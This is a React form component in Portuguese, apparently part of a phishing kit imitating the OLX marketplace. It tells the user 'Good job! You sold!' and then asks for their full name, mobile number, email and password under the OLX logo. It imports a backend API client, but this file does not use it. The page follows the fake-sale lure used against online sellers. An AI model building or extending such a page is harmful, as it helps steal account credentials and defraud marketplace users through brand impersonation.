import React, { useState } from 'react';
import './Steps.css';
import OLXLogo from './OLXLogo';
import PhoneMockups from './PhoneMockups';
import DownloadButtons from './DownloadButtons';
import Footer from './Footer';
import { Eye, EyeOff } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const Step2Form = ({ onNext, formData, updateFormData }) => {
  const [showPassword, setShowPassword] = useState(false);
  const [localData, setLocalData] = useState({
    name: formData.name || '',
    phone: formData.phone || '',
    email: formData.email || '',
    password: formData.password || ''
  });

  const handleSubmit = (e) => {
    e.preventDefault();
    updateFormData(localData);
    onNext();
  };

  const handleChange = (field, value) => {
    setLocalData(prev => ({ ...prev, [field]: value }));
  };

  return (
    <div className="step-container">
      <OLXLogo />
      
      <div className="step-content">
        <h1 className="step-title purple-title">Bom trabalho! Você vendeu!</h1>
        <p className="step-description">Preencha seus dados para continuarmos:</p>
        
        <form className="step-form" onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Nome completinho"
            className="form-input"
            value={localData.name}
            onChange={(e) => handleChange('name', e.target.value)}
            required
          />
          <input
            type="tel"
            placeholder="Celular (ex: (11) 99999-9999)"
            className="form-input"
            value={localData.phone}
            onChange={(e) => handleChange('phone', e.target.value)}
            required
          />
          <input
            type="email"
            placeholder="E-mail"
            className="form-input"
            value={localData.email}
            onChange={(e) => handleChange('email', e.target.value)}
            required
          />
          <div className="password-input-wrapper">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="Senha super secreta"
              className="form-input password-input"
              value={localData.password}
              onChange={(e) => handleChange('password', e.target.value)}
              required
            />
            <button
              type="button"
              className="password-toggle"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>
          <button type="submit" className="btn-primary">
            Avançar
          </button>
        </form>
      </div>

      <div className="app-download-section">
        <h2 className="app-download-title">
          <span className="purple-bold">baixe o OLX app</span> e comece a vender com desconto
        </h2>
        <PhoneMockups />
        <DownloadButtons />
      </div>

      <Footer />
    </div>
  );
};

export default Step2Form;